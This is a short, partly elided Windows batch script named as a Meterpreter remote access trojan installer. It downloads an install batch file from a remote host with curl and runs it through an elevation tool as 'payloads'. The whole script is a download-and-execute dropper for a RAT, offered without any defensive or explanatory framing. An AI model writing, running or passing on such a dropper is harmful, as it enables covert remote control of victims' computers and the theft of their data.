@echo on
rem *******************************************************
rem nit-meterpreter-local-RAT.bat
...
rem
set DefRevL_Install=defrevl1234.install.bat
...
%CURLEXE% %host00301%%DefRevL_Install% -o %LocalFolder%\%DefRevL_Install%

echo == Install or Run Payloads ==
rem

rem Install DefRevL Payloads ===
%ELEEXE% cmd.exe /c %LocalFolder%\%DefRevL_Install%
